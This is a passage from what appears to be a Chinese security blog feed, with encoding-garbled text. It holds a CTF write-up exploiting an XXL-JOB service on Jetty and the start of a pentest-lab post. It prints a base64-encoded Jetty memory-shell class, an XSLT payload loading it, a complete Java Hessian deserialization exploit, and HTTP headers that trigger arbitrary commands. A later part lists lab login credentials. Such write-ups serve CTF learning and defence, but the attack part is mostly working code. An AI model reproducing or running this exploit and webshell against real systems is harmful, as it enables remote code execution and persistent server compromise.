ABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAxnZXRQYXJhbWV0ZXIBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAOZ2V0SHR0cENoYW5uZWwBACgoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENoYW5uZWw7AQAkb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDaGFubmVsAQAJZ2V0U2VydmVyAQAjKClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1NlcnZlcjsBAB9vcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvU2VydmVyAQAKZ2V0SGFuZGxlcgEAJCgpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEA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&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;com.xxl.job.core.JettyGodzillaMemshell&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å®šè¦è®°å¾—defineClassçš„ç±»åè¦æ”¹å•Šï¼Œä¸ç„¶å°±æŠ¥é”™äº†ï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†æ‰“äº†å¥½ä¹…éƒ½æ²¡é€šğŸ˜­ï¼Œç„¶åå»å‰é¢è¯•äº†ä¸€ä¸‹apiçš„æœªæˆæƒï¼Œä¹Ÿæ˜¯æ²¡å†™å¯¹ç±»åå¯¼è‡´çš„ğŸ˜­æµªè´¹æˆ‘å¥½å¤šæ—¶é—´</p></blockquote><p>ç„¶åå°±æ˜¯ä¸€æŠŠæ¢­payloadæ‰“ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172043678.png" alt="image-20241128172043678"></p><p>ç„¶åè¯·æ±‚å¤´x-fuck-dataä¸ºcmdæ—¶å°±å¯ä»¥ç›´æ¥ä»»æ„å‘½ä»¤äº†</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-fuck-data</span><span class="hljs-punctuation">: </span>cmd<br><span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>ls /<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172129357.png" alt="image-20241128172129357"></p><p>æƒ³ç”¨å“¥æ–¯æ‹‰å»è¿æ¥çš„ï¼Œä½†æ˜¯è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æƒ³è¯•ä¸€ä¸‹å†°èé©¬çš„ï¼Œä½†æ˜¯æ‰“è¿›å»è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å’ŒHandlerçš„æœºåˆ¶æœ‰å…³ï¼ŒJettyè¿™å—è¿˜ä¸å¤ªç†Ÿï¼Œæœ‰æœºä¼šå†ç ”ç©¶</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/ph4nt0mer/p/13913252.html">https://www.cnblogs.com/ph4nt0mer/p/13913252.html</a></p><p><a href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></p><p><a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p><a href="https://blog.csdn.net/2301_79724395/article/details/141229224">https://blog.csdn.net/2301_79724395/article/details/141229224</a></p><p>å®˜æ–¹wpï¼š<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç”±äºé¢˜ç›®æ˜¯å…¬å…±é¶æœºç°åœ¨å·²ç»æŒ‚äº†ï¼Œæ‰€ä»¥å¤ç°éœ€è¦è‡ªå·±æ­å»ºé¢˜ç›®ç¯å¢ƒ&lt;/p&gt;
&lt;p&gt;è·Ÿç€è¿™ç¯‡æ–‡ç« æ¥é…ç½®ä¸€ä¸‹ï¼š&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºå››</title>
    <link href="https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
    <id>https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</id>
    <published>2024-11-15T14:00:56.000Z</published>
    <updated>2024-11-16T15:05:14.349Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºå…¼å®¹æ€§å·²ç»ä¼¼äº†ä¸¤ä¸ªé¶åœºï¼Œæ±‚æ±‚ä½ åˆ«ä¼¼äº†</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ VMnet0å’ŒVMnet1éƒ½æ˜¯ä»…ä¸»æœºæ¨¡å¼</p><p><img src="https://cdn.clown2024.cn/image-20241115220741988.png" alt="image-20241115220741988"></p><p><strong>webé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221245366.png" alt="image-20241115221245366"></p><p><strong>win7</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221326010.png" alt="image-20241115221326010"></p><p><strong>DC</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221401258.png" alt="image-20241115221401258"></p><h2 id="é¶åœºæ‹“æ‰‘å›¾"><a href="#é¶åœºæ‹“æ‰‘å›¾" class="headerlink" title="é¶åœºæ‹“æ‰‘å›¾"></a>é¶åœºæ‹“æ‰‘å›¾</h2><p><img src="https://cdn.clown2024.cn/image-20241115221119472.png" alt="image-20241115221119472"></p><p>æˆ‘ä»¬å¯åŠ¨ä¹‹åè¦å»webé¶æœºé‡Œé¢å¯åŠ¨ä¸‰ä¸ªå®¹å™¨æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241115222514020.png" alt="image-20241115222514020"></p><p>æˆ‘ä»¬å¯åŠ¨å‰ä¸‰ä¸ªå®¹å™¨æœåŠ¡å³å¯</p><p>ç„¶åæˆ‘ä»¬çš„æ”»å‡»æœºè‡ªç„¶ä¹Ÿè¦åœ¨VMnet0çš„ç½‘æ®µ</p><blockquote><p>å¥½æ¬¸é¶æœºç»ˆäºæ´»äº†ä¸€æ¬¡äº†ğŸ˜­</p></blockquote><h2 id="æœºå™¨å¯†ç "><a href="#æœºå™¨å¯†ç " class="headerlink" title="æœºå™¨å¯†ç "></a>æœºå™¨å¯†ç </h2><ul><li>ubuntu:ubuntu <strong>åŸŸæˆå‘˜æœºå™¨</strong></li><li>douser:Dotest123 